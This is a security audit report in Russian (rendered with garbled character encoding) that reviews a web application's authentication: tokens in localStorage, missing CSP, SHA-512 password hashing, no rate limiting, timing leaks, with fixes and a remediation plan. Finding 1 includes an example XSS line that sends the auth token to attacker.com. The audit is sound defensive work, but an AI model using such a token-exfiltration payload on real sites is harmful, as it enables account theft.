# –ê—É–¥–∏—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è

## üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò (—Ç—Ä–µ–±—É—é—Ç –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ–≥–æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è)

### 1. –¢–æ–∫–µ–Ω—ã –≤ localStorage - XSS —É—è–∑–≤–∏–º–æ—Å—Ç—å
**–°–µ—Ä—å–µ–∑–Ω–æ—Å—Ç—å:** –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø  
**–†–∏—Å–∫:** –ö—Ä–∞–∂–∞ —Ç–æ–∫–µ–Ω–∞ —á–µ—Ä–µ–∑ XSS ‚Üí –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –∞–∫–∫–∞—É–Ω—Ç—É

**–¢–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ:**
```javascript
localStorage.setItem('auth_token', result.token);
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –õ—é–±–æ–π XSS-—Å–∫—Ä–∏–ø—Ç –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å:
```javascript
fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
```

**–†–µ—à–µ–Ω–∏–µ:**
- ‚úÖ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å httpOnly cookies (—Ç–æ–∫–µ–Ω –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω JavaScript)
- ‚úÖ –î–æ–±–∞–≤–∏—Ç—å SameSite=Strict (–∑–∞—â–∏—Ç–∞ –æ—Ç CSRF)
- ‚úÖ Secure flag (—Ç–æ–ª—å–∫–æ HTTPS)

---

### 2. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ Content-Security-Policy
**–°–µ—Ä—å–µ–∑–Ω–æ—Å—Ç—å:** –í–´–°–û–ö–ê–Ø  
**–†–∏—Å–∫:** XSS –∞—Ç–∞–∫–∏, –∏–Ω—ä–µ–∫—Ü–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤

**–ü—Ä–æ–±–ª–µ–º–∞:** –ù–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π –Ω–∞ –∑–∞–≥—Ä—É–∑–∫—É —Å–∫—Ä–∏–ø—Ç–æ–≤

**–†–µ—à–µ–Ω–∏–µ:**
–î–æ–±–∞–≤–∏—Ç—å –≤ `index.html`:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline' https://cdn.poehali.dev https://mc.yandex.ru; 
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               img-src 'self' data: https:;
               connect-src 'self' https://functions.poehali.dev;
               font-src 'self' https://fonts.gstatic.com;">
```

---

### 3. –°–ª–∞–±–æ–µ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π (SHA-512)
**–°–µ—Ä—å–µ–∑–Ω–æ—Å—Ç—å:** –í–´–°–û–ö–ê–Ø  
**–†–∏—Å–∫:** –ü—Ä–∏ —É—Ç–µ—á–∫–µ –ë–î –ø–∞—Ä–æ–ª–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –≤–∑–ª–æ–º–∞–Ω—ã –∑–∞ —á–∞—Å—ã

**–¢–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ:**
```python
pwd_hash = hashlib.sha512((password + salt).encode()).hexdigest()
```

**–ü—Ä–æ–±–ª–µ–º–∞:** SHA-512 —Å–ª–∏—à–∫–æ–º –±—ã—Å—Ç—Ä—ã–π ‚Üí GPU brute-force

**–†–µ—à–µ–Ω–∏–µ:**
```python
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

---

### 4. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ Rate Limiting
**–°–µ—Ä—å–µ–∑–Ω–æ—Å—Ç—å:** –í–´–°–û–ö–ê–Ø  
**–†–∏—Å–∫:** Brute-force –∞—Ç–∞–∫–∏ –Ω–∞ /login, DDoS

**–ü—Ä–æ–±–ª–µ–º–∞:** –ú–æ–∂–Ω–æ –¥–µ–ª–∞—Ç—å —Ç—ã—Å—è—á–∏ –∑–∞–ø—Ä–æ—Å–æ–≤ –≤ —Å–µ–∫—É–Ω–¥—É

**–†–µ—à–µ–Ω–∏–µ:**
- –î–æ–±–∞–≤–∏—Ç—å Redis + rate limiting
- –ú–∞–∫—Å–∏–º—É–º 5 –ø–æ–ø—ã—Ç–æ–∫ –ª–æ–≥–∏–Ω–∞ –∑–∞ 15 –º–∏–Ω—É—Ç
- –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ IP –ø–æ—Å–ª–µ 10 –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫

---

## üü† –°–†–ï–î–ù–ò–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò (–∏—Å–ø—Ä–∞–≤–∏—Ç—å –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è)

### 5. –î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ localStorage
**–°–µ—Ä—å–µ–∑–Ω–æ—Å—Ç—å:** –°–†–ï–î–ù–Ø–Ø  
**–†–∏—Å–∫:** –ö–ª–∏–µ–Ω—Ç –º–æ–∂–µ—Ç –ø–æ–¥–¥–µ–ª–∞—Ç—å —Ä–æ–ª—å (—Ö–æ—Ç—è –±—ç–∫–µ–Ω–¥ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç)

**–†–µ—à–µ–Ω–∏–µ:**
- –•—Ä–∞–Ω–∏—Ç—å —Ç–æ–ª—å–∫–æ —Ç–æ–∫–µ–Ω
- –î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ–ª—É—á–∞—Ç—å —Å –±—ç–∫–µ–Ω–¥–∞ –ø—Ä–∏ –∫–∞–∂–¥–æ–π –∑–∞–≥—Ä—É–∑–∫–µ

---

### 6. –¢–æ–∫–µ–Ω—ã –Ω–µ —Ä–æ—Ç–∏—Ä—É—é—Ç—Å—è
**–°–µ—Ä—å–µ–∑–Ω–æ—Å—Ç—å:** –°–†–ï–î–ù–Ø–Ø  
**–†–∏—Å–∫:** –£–∫—Ä–∞–¥–µ–Ω–Ω—ã–π —Ç–æ–∫–µ–Ω —Ä–∞–±–æ—Ç–∞–µ—Ç 30 –¥–Ω–µ–π

**–†–µ—à–µ–Ω–∏–µ:**
- Refresh tokens + access tokens
- Access token –∂–∏–≤—ë—Ç 15 –º–∏–Ω—É—Ç
- Refresh token –∂–∏–≤—ë—Ç 30 –¥–Ω–µ–π

---

### 7. –ù–µ—Ç –∑–∞—â–∏—Ç—ã –æ—Ç timing attacks
**–°–µ—Ä—å–µ–∑–Ω–æ—Å—Ç—å:** –°–†–ï–î–ù–Ø–Ø  
**–†–∏—Å–∫:** –ú–æ–∂–Ω–æ —É–∑–Ω–∞—Ç—å —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ email —á–µ—Ä–µ–∑ –≤—Ä–µ–º—è –æ—Ç–≤–µ—Ç–∞

**–¢–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ:**
```python
if not user or not verify_password(password, user['password_hash']):
    return error_response(401, 'Invalid email or password')
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ï—Å–ª–∏ user=None, –ø–∞—Ä–æ–ª—å –Ω–µ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è ‚Üí –±—ã—Å—Ç—Ä—ã–π –æ—Ç–≤–µ—Ç

**–†–µ—à–µ–Ω–∏–µ:**
```python
# –í—Å–µ–≥–¥–∞ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Ö–µ—à, –¥–∞–∂–µ –µ—Å–ª–∏ user –Ω–µ –Ω–∞–π–¥–µ–Ω
dummy_hash = bcrypt.hashpw(b'dummy', bcrypt.gensalt())
password_valid = verify_password(password, user['password_hash'] if user else dummy_hash)
if not user or not password_valid:
    return error_response(401, 'Invalid credentials')
```

---

### 8. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ–ø—ã—Ç–æ–∫ –≤—Ö–æ–¥–∞
**–°–µ—Ä—å–µ–∑–Ω–æ—Å—Ç—å:** –°–†–ï–î–ù–Ø–Ø  
**–†–∏—Å–∫:** –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ—Ç—Å–ª–µ–¥–∏—Ç—å –∞—Ç–∞–∫–∏

**–†–µ—à–µ–Ω–∏–µ:**
- –õ–æ–≥–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ failed login attempts
- IP, timestamp, user_id
- –ê–ª–µ—Ä—Ç—ã –ø—Ä–∏ 10+ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫

---

## üü° –ù–ò–ó–ö–ò–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò (—É–ª—É—á—à–µ–Ω–∏—è)

### 9. –ù–µ—Ç HTTP Strict Transport Security (HSTS)
**–†–µ—à–µ–Ω–∏–µ:** –î–æ–±–∞–≤–∏—Ç—å header `Strict-Transport-Security: max-age=31536000; includeSubDomains`

### 10. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ X-Frame-Options
**–†–µ—à–µ–Ω–∏–µ:** –î–æ–±–∞–≤–∏—Ç—å header `X-Frame-Options: DENY` (–∑–∞—â–∏—Ç–∞ –æ—Ç clickjacking)

### 11. –ü–∞—Ä–æ–ª—å –ø–µ—Ä–µ–¥–∞—ë—Ç—Å—è –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ —á–µ—Ä–µ–∑ JSON
**–†–µ—à–µ–Ω–∏–µ:** –£–∂–µ –∑–∞—â–∏—â–µ–Ω–æ HTTPS, –Ω–æ –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å client-side hashing

### 12. –ù–µ—Ç –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ (2FA)
**–†–µ—à–µ–Ω–∏–µ:** –î–æ–±–∞–≤–∏—Ç—å TOTP (Google Authenticator)

---

## ‚úÖ –ß–¢–û –£–ñ–ï –°–î–ï–õ–ê–ù–û –•–û–†–û–®–û

1. ‚úÖ –ü–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ SQL-–∑–∞–ø—Ä–æ—Å—ã (–∑–∞—â–∏—Ç–∞ –æ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏–π)
2. ‚úÖ –°–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö (–∑–∞—â–∏—Ç–∞ –æ—Ç XSS)
3. ‚úÖ HTML-—ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –±—ç–∫–µ–Ω–¥–µ
4. ‚úÖ –í–∞–ª–∏–¥–∞—Ü–∏—è email, –ø–∞—Ä–æ–ª–µ–π, user_id
5. ‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–æ–ª–∏ –Ω–∞ –±—ç–∫–µ–Ω–¥–µ –ø—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ
6. ‚úÖ –¢–æ–∫–µ–Ω—ã —Ö–µ—à–∏—Ä—É—é—Ç—Å—è –ø–µ—Ä–µ–¥ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –≤ –ë–î (SHA-256)
7. ‚úÖ CORS –Ω–∞—Å—Ç—Ä–æ–µ–Ω –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ
8. ‚úÖ Expires time –¥–ª—è —Ç–æ–∫–µ–Ω–æ–≤
9. ‚úÖ –ó–∞–ø—Ä–µ—Ç —Å–∞–º–æ—É–¥–∞–ª–µ–Ω–∏—è/—Å–∞–º–æ–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏

---

## üìã –ü–õ–ê–ù –ò–°–ü–†–ê–í–õ–ï–ù–ò–ô (–ø–æ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç—É)

### –§–∞–∑–∞ 1 - –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è (1-2 –¥–Ω—è)
1. ‚úÖ –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ —Ç–æ–∫–µ–Ω—ã –Ω–∞ httpOnly cookies
2. ‚úÖ –î–æ–±–∞–≤–∏—Ç—å CSP headers
3. ‚úÖ –ó–∞–º–µ–Ω–∏—Ç—å SHA-512 –Ω–∞ bcrypt –¥–ª—è –ø–∞—Ä–æ–ª–µ–π

### –§–∞–∑–∞ 2 - –í–∞–∂–Ω—ã–µ —É–ª—É—á—à–µ–Ω–∏—è (3-5 –¥–Ω–µ–π)
4. ‚¨ú –î–æ–±–∞–≤–∏—Ç—å rate limiting (Redis)
5. ‚¨ú –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å refresh tokens
6. ‚¨ú –ó–∞—â–∏—Ç–∞ –æ—Ç timing attacks
7. ‚¨ú –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

### –§–∞–∑–∞ 3 - –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞ (–Ω–µ–¥–µ–ª—è)
8. ‚¨ú HSTS + security headers
9. ‚¨ú –î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
10. ‚¨ú IP whitelist –¥–ª—è –∞–¥–º–∏–Ω–æ–≤

---

## üîç –ö–ê–ö –ë–´–°–¢–†–û –ú–û–ñ–ù–û –í–ó–õ–û–ú–ê–¢–¨?

### –°—Ü–µ–Ω–∞—Ä–∏–π 1: XSS –∞—Ç–∞–∫–∞
**–°–ª–æ–∂–Ω–æ—Å—Ç—å:** –°—Ä–µ–¥–Ω—è—è  
**–í—Ä–µ–º—è:** 1-2 —á–∞—Å–∞  
**–ú–µ—Ç–æ–¥:** –ù–∞–π—Ç–∏ XSS ‚Üí —É–∫—Ä–∞—Å—Ç—å —Ç–æ–∫–µ–Ω –∏–∑ localStorage ‚Üí –¥–æ—Å—Ç—É–ø –∫–æ –≤—Å–µ–º –¥–∞–Ω–Ω—ã–º

### –°—Ü–µ–Ω–∞—Ä–∏–π 2: Brute-force login
**–°–ª–æ–∂–Ω–æ—Å—Ç—å:** –ù–∏–∑–∫–∞—è  
**–í—Ä–µ–º—è:** 1-10 —á–∞—Å–æ–≤ (–±–µ–∑ rate limit)  
**–ú–µ—Ç–æ–¥:** –ü–µ—Ä–µ–±–æ—Ä –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π –¥–ª—è –∏–∑–≤–µ—Å—Ç–Ω—ã—Ö email

### –°—Ü–µ–Ω–∞—Ä–∏–π 3: MITM –∞—Ç–∞–∫–∞
**–°–ª–æ–∂–Ω–æ—Å—Ç—å:** –í—ã—Å–æ–∫–∞—è  
**–í—Ä–µ–º—è:** –ó–∞–≤–∏—Å–∏—Ç –æ—Ç –∂–µ—Ä—Ç–≤—ã  
**–ú–µ—Ç–æ–¥:** –ü–µ—Ä–µ—Ö–≤–∞—Ç HTTP (–µ—Å–ª–∏ –Ω–µ—Ç HTTPS) ‚Üí –∫—Ä–∞–∂–∞ —Ç–æ–∫–µ–Ω–∞

---

## üõ°Ô∏è –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–ò

1. **–ù–ï–ú–ï–î–õ–ï–ù–ù–û:** –ü–µ—Ä–µ–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω—ã –Ω–∞ httpOnly cookies
2. **–°–ï–ì–û–î–ù–Ø:** –î–æ–±–∞–≤—å—Ç–µ CSP headers
3. **–ù–ê –≠–¢–û–ô –ù–ï–î–ï–õ–ï:** –ó–∞–º–µ–Ω–∏—Ç–µ SHA-512 –Ω–∞ bcrypt
4. **–í –¢–ï–ß–ï–ù–ò–ï –ú–ï–°–Ø–¶–ê:** Rate limiting + refresh tokens
5. **–ü–û–°–¢–û–Ø–ù–ù–û:** –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ª–æ–≥–æ–≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
